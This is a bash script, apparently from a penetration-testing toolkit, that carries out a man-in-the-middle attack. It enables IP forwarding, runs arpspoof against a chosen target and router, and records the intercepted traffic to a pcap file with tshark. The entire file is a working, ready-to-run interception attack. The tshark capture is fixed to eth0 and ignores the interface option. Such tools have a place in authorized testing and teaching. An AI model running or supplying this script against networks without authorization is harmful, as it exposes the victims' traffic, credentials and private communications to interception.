#!/bin/bash

# Check if user is root
if [[ $EUID -ne 0 ]]; then
	echo "[!] You must be root"
	exit 1
fi

# Check if user provided any arguments
if [[ $# == 0 ]]; then
	echo "Syntax: sudo bash MitM.sh [-i interface] -t target_ip -r router_ip"
	echo "options:"
	echo "	i: Interface name (Default: eth0)"
	echo "	t: target ip address"
	echo "  r: router ip address"
	echo "	h: Help prompt"
	exit 2
fi

# Parse flags from user
while getopts ":hi:t:r:" opt; do
	case ${opt} in
		h )
			echo "Syntax: sudo bash MitM.sh [-i interface] -t target_ip -r router_ip"
			echo "options:"
			echo "	i: Interface name (Default: eth0)"
			echo "	t: target ip address"
			echo "  r: router ip address"
			echo "	h: Help prompt"
			exit
			;;
		i )
			interface=$OPTARG
			;;
		t )
			target=$OPTARG
			;;
		r ) 
			router=$OPTARG
			;;
		\? )
			echo "Invalid option: $OPTARG" 1>&2
			exit 2
			;;
	    : )
	        echo "Invalid Option: -$OPTARG requires an argument" 1>&2
	        exit 2
	        ;;
	esac
done

# Check if required inputs have been inputted
if [[ -z $target ]]; then
	echo "[!] Missing required argument: -t"
	echo ""
	echo "Syntax: sudo bash MitM.sh [-i interface] -t target_ip -r router_ip"
	echo "options:"
	echo "	i: Interface name (Default: eth0)"
	echo "	t: target ip address"
	echo "  r: router ip address"
	echo "	h: Help prompt"
	exit 2
fi

if [[ -z $router ]]; then
	echo "[!] Missing required argument: -r"
	echo ""
	echo "Syntax: sudo bash MitM.sh [-i interface] -t target_ip -r router_ip"
	echo "options:"
	echo "	i: Interface name (Default: eth0)"
	echo "	t: target ip address"
	echo "  r: router ip address"
	echo "	h: Help prompt"
	exit 2
fi

if [[ -z $interface ]]; then
	interface="eth0"
fi

# Get date and time to log actions taken
TODAY=$(date +%d%m%y)
DATETIME=$(date)
LOG_PATH="../logs/$TODAY/actions.logs"

if ! [[ -e $LOG_PATH ]]; then
	mkdir -p ../logs/$TODAY
	touch $LOG_PATH
fi

# Create directory and set path to save results
mkdir -p ../logs/$TODAY/$target/attacks
SAVE_PATH="../logs/$TODAY/$target/attacks/MitM.pcap"

# Log Man in the Middle attack
echo "$DATETIME" >> $LOG_PATH
echo "Man in the Middle attack conducted on $target" >> $LOG_PATH
echo "Routed from router IP address $router" >> $LOG_PATH
echo "pcap file saved in logs/$TODAY/$target/attacks/MitM.pcap" >> $LOG_PATH
echo "" >> $LOG_PATH

# enable ip forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Run arpspoof
echo "[!] Man in the Middle attack will start in 1 second."
sleep 1

sudo arpspoof -i $interface -t $target $router > /dev/null 2>&1 &
sudo arpspoof -i $interface -t $router $target > /dev/null 2>&1 &

# Run tshark
tshark -i eth0 -w $SAVE_PATH > /dev/null 2>&1 &

read -p "[!] Press enter to stop spoofing " input

# Kill processes
sudo pkill -2 "arpspoof"
pkill -2 "tshark"

# disable ip forwarding when script is terminated
sudo sysctl -w net.ipv4.ip_forward=0

echo "pcap file saved in logs/$TODAY/$target/attacks/MitM.pcap"